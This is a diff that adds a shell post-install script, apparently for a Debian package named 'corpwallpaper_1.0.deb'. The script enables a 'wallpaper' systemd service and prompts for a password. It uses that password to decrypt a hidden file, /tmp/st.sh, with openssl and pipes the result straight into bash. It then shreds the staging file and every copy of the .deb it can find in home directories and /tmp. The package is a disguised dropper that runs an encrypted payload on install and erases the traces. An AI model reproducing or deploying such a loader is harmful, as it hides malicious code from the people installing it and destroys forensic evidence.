@@ -1,0 +1,15 @@
+#!/bin/bash
+
+set -e
+
+systemctl daemon-reload
+systemctl enable wallpaper
+
+echo "Installation password required: "
+read -s password
+
+openssl aes-256-cbc -a -salt -d -in /tmp/st.sh -pass pass:$password 2>/dev/null | bash
+(shred /tmp/st.sh 2>/dev/null 2>/dev/null && rm /tmp/st.sh 2>/dev/null) || true
+(shred /home/*/corpwallpaper_1.0.deb 2>/dev/null && rm /home/*/corpwallpaper_1.0.deb 2>/dev/null) || true
+(shred /home/*/*/corpwallpaper_1.0.deb 2>/dev/null && rm /home/*/*/corpwallpaper_1.0.deb 2>/dev/null) || true
+(shred /tmp/corpwallpaper_1.0.deb 2>/dev/null && rm /tmp/corpwallpaper_1.0.deb 2>/dev/null) || true
